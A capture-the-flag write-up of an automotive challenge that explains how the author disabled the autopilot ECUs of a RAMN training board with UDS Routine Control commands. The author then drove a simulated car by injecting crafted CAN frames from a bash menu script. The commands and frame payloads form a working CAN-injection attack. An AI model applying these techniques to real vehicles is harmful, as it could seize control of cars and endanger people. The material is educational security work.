# Time to Drive - SPIRITCYBER Automotive CTF Writeup

**CTF:** SPIRITCYBER Automotive CTF @ SICW 2025  
**Team Result:** 🥉 3rd Place  
**Challenge Name:** Time to Drive  
**Category:** Automotive/Hardware  
**Description:**  
```
There is RAMN booth close to you. Come connect to CANH and CANL and drive a lap 
around the map to win this flag. The driver will try to stop you. Someone is 
driving the car.

Note: You can borrow our peakCAN adapter. On Windows, you need to install 
drivers first.

Note: You can use your RAMN board (CAN RX Monitor screen) to identify CAN IDs 
and payloads format. The RAMN board will ignore CRCs and counters. You can also 
refer to RAMN DBC file (https://github.com/ToyotaInfoTech/RAMN/blob/main/misc/busmaster_ramn.dbc).
```

---

## TL;DR

This challenge required physically hijacking CAN bus control of a simulated vehicle in CARLA by connecting to the RAMN (Redacted Automotive Miniature Network) board. The key was using UDS (Unified Diagnostic Services) Routine Control commands to stop the autopilot ECUs from transmitting, then sending custom CAN messages to manually drive the vehicle around the map.

**Flag:** `SICW_CAR{drive_by_two_wires}`

---

## Challenge Setup

The challenge involved a physical hardware setup:
- **RAMN Board**: An automotive security research and training platform
- **CARLA Simulator**: A simulated vehicle being displayed on screen
- **peakCAN Adapter**: Hardware interface to connect to the CAN bus
- **Physical Connection**: Direct connection to CANH and CANL wires

The simulated vehicle was running on autopilot and continuously transmitting CAN messages through the RAMN board's ECUs.

---

## Initial Reconnaissance

### Setting Up the CAN Interface

First, I connected the peakCAN adapter to my PC and configured the CAN interface on my Kali VM:

```bash
# Check if can0 interface is available
ip a

# Configure CAN interface with 500k bitrate
sudo ip link set can0 up type can bitrate 500000 && sudo ip link set can0 up
```

The bitrate of **500000** (500 kbps) is a common standard for automotive CAN bus networks.

### Observing CAN Traffic

To verify the connection was working:

```bash
candump can0
```

This showed a continuous stream of CAN messages being transmitted by the autopilot system. The traffic was real-time data from the vehicle's various control systems.

### Understanding the RAMN Board Architecture

The RAMN board has multiple ECUs (Electronic Control Units):

**ECU B** controls:
- Steering wheel (rotating potentiometer)
- Parking brake (two-position switch)
- Lighting controls (four-position switch)

**ECU C** controls:
- Accelerator pedal (sliding potentiometer)
- Brake pedal (sliding potentiometer)
- Gear stick (joystick: up/down for gears, left/right for turn indicators, press for horn)

Each ECU has specific CAN IDs for receiving commands and transmitting responses:
- **ECU B**: Receives on `0x7e1`, transmits on `0x7e9`
- **ECU C**: Receives on `0x7e2`, transmits on `0x7ea`

---

## The Core Problem

### Discovering the Override Issue

I used the **RAMN CAN RX Monitor screen** to observe incoming CAN messages and identify the payloads for different vehicle controls. By manipulating the physical controls on the RAMN board, I could see which CAN IDs and data payloads corresponded to each action.

Here are the CAN message payloads I discovered:

| Control | CAN ID | Payload |
|---------|--------|---------|
| Start Engine (START) | `1B8` | `0600000000000000` |
| Engine ON | `1B8` | `0400000000000000` |
| Engine OFF | `1B8` | `0000000000000000` |
| Shift to Drive (D) | `077` | `0100000000000000` |
| Shift to Reverse (R) | `077` | `FF00000000000000` |
| Shift to Park (P) | `077` | `0000000000000000` |
| Accelerator 25% | `039` | `0423000000000000` |
| Accelerator 50% | `039` | `07EF000000000000` |
| Brake 0% | `024` | `0000000000000000` |
| Brake 100% | `024` | `0F10000000000000` |
| Steering Center | `062` | `0808000000000000` |
| Steering Left | `062` | `0304000000000000` |
| Steering Right | `062` | `0C0B000000000000` |

**The Problem:** When I tried sending these commands using `cansend`, the vehicle didn't respond. The autopilot system was continuously sending its own CAN messages at regular intervals, which **overwrote my injected commands** before they could take effect.

This is a classic **message collision** problem in CAN bus attacks.

---

## Solution Path

### Step 1: Understanding UDS Routine Control

The solution required using **UDS (Unified Diagnostic Services)**, specifically the **Routine Control service (0x31)**. This service allows executing custom routines on ECUs.

UDS Routine Control has three sub-functions:
- `0x01` - Start a routine
- `0x02` - Stop a routine  
- `0x03` - Request routine results

Routine identifiers range from `0x0200` to `0xDFFF` are ECU-specific. Through experimentation (or documentation), I learned that **routine ID `0x0200`** could stop the ECUs from transmitting their periodic CAN messages.

### Step 2: Stopping the Autopilot

I used the `isotpsend` tool to send UDS commands over ISO-TP (ISO 15765-2), which is the transport protocol for diagnostic services over CAN:

```bash
# Stop ECU B from transmitting (steering controls)
echo "31 01 02 00" | isotpsend -s 7e1 -d 7e9 -l can0

# Stop ECU C from transmitting (pedal and gear controls)  
echo "31 01 02 00" | isotpsend -s 7e2 -d 7ea -l can0
```

Breaking down the command:
- `31` - UDS Service ID for Routine Control
- `01` - Sub-function: Start routine
- `02 00` - Routine ID: 0x0200 (stop periodic transmission)
- `-s 7e1` - Source CAN ID (tester)
- `-d 7e9` - Destination CAN ID (ECU response)
- `-l can0` - CAN interface

After sending these commands, the periodic CAN traffic from ECU B and ECU C stopped, giving me complete control!

### Step 3: Building the Control Script

With the autopilot disabled, I could now inject my own CAN messages. I created a bash script to provide manual control via a menu interface:

```bash
#!/bin/bash

INTERFACE="can0"

clear
echo "================================"
echo "   RAMN Manual Control Menu"
echo "================================"
echo "Interface: $INTERFACE"
echo ""

# --- MENU LOOP ---
while true; do
    echo "Select an action:"
    echo " 1) Start Engine"
    echo " 2) Engine ON"
    echo " 3) Engine OFF"
    echo " 4) Shift: Drive (D)"
    echo " 5) Shift: Reverse (R)"
    echo " 6) Shift: Park (P)"
    echo " 7) Accelerator 25%"
    echo " 8) Accelerator 50%"
    echo " 9) Brake 0%"
    echo "10) Brake 100%"
    echo "11) Steering Center"
    echo "12) Steering Left"
    echo "13) Steering Right"
    echo " 0) Exit"
    echo "--------------------------------"

    read -p "Enter choice: " choice
    echo ""

    case $choice in
        1)
            echo "# Start Engine (START position)"
            cansend $INTERFACE 1B8#0600000000000000
            ;;
        2)
            echo "# Engine ON"
            cansend $INTERFACE 1B8#0400000000000000
            ;;
        3)
            echo "# Engine OFF"
            cansend $INTERFACE 1B8#0000000000000000
            ;;
        4)
            echo "# Shift to Drive (D)"
            cansend $INTERFACE 077#0100000000000000
            ;;
        5)
            echo "# Shift to Reverse"
            cansend $INTERFACE 077#FF00000000000000
            ;;
        6)
            echo "# Shift to Park (P)"
            cansend $INTERFACE 077#0000000000000000
            ;;
        7)
            echo "# Accelerator 25%"
            cansend $INTERFACE 039#0423000000000000
            ;;
        8)
            echo "# Accelerator 50%"
            cansend $INTERFACE 039#07EF000000000000
            ;;
        9)
            echo "# Brake 0%"
            cansend $INTERFACE 024#0000000000000000
            ;;
        10)
            echo "# Brake 100%"
            cansend $INTERFACE 024#0F10000000000000
            ;;
        11)
            echo "# Steering Center"
            cansend $INTERFACE 062#0808000000000000
            ;;
        12)
            echo "# Steering Left"
            cansend $INTERFACE 062#0304000000000000
            ;;
        13)
            echo "# Steering Right"
            cansend $INTERFACE 062#0C0B000000000000
            ;;
        0)
            echo "Exiting..."
            break
            ;;
        *)
            echo "Invalid selection. Try again."
            ;;
    esac

    echo ""
done
```

### Step 4: Driving the Lap

Using the control script, I manually drove the vehicle through the following sequence:

1. **Start Engine** (option 1)
2. **Engine ON** (option 2)  
3. **Shift to Drive** (option 4)
4. **Accelerator 50%** (option 8) to get moving
5. **Steering Left/Right** (options 12/13) to navigate corners
6. **Brake** as needed (options 9-10) to slow down
7. **Steering Center** (option 11) to straighten out

By coordinating these commands via keyboard input, I successfully completed a full lap around the map!

---

## Key Takeaways

### What Made This Challenge Interesting

1. **Physical Hardware Component**: Unlike most CTF challenges, this required interacting with actual automotive hardware, making it more realistic and engaging.

2. **Multi-Layer Problem**: The solution required understanding:
   - CAN bus protocols
   - UDS diagnostic services  
   - ISO-TP transport layer
   - ECU architecture
   - Timing and message priority

3. **Real-World Automotive Security**: This challenge demonstrated actual vulnerabilities that exist in modern vehicles, where diagnostic services can be abused to hijack control systems.

### Attack Techniques Demonstrated

- **CAN Bus Sniffing**: Passive observation of network traffic
- **Payload Reverse Engineering**: Determining message formats through observation
- **Message Injection**: Injecting crafted CAN frames
- **ECU Manipulation**: Using diagnostic services to alter ECU behavior
- **Man-in-the-Middle**: Taking control between legitimate systems

---

## Tools Used

- **Kali Linux**: Operating system
- **peakCAN adapter**: Hardware CAN interface
- **can-utils**: Linux CAN utilities (`ip`, `cansend`, `candump`, `isotpsend`)
- **RAMN Board**: Target hardware platform
- **CARLA Simulator**: Vehicle simulation environment

---

## References

- [RAMN GitHub Repository](https://github.com/ToyotaInfoTech/RAMN)
- [RAMN DBC File](https://github.com/ToyotaInfoTech/RAMN/blob/main/misc/busmaster_ramn.dbc)
- [ISO 14229-1: UDS Specification](https://www.iso.org/standard/72439.html)
- [ISO 15765-2: ISO-TP Protocol](https://www.iso.org/standard/66574.html)

---

## Flag

After successfully completing the lap:

```
SICW_CAR{drive_by_two_wires}
```

A fitting flag name that references the two wires (CANH and CANL) used in the CAN bus differential signaling system!

---

## Conclusion

This was an excellent hands-on automotive security challenge that combined hardware hacking, protocol analysis, and reverse engineering. The requirement to physically interact with the RAMN board made it particularly memorable and educational.

Congratulations to SPIRITCYBER for creating such an engaging challenge, and huge thanks to our team for the collaborative effort that earned us 3rd place! 🥉

**Author:** Reuel Magistrado - VicOne PH Team  
**Date:** SICW 2025
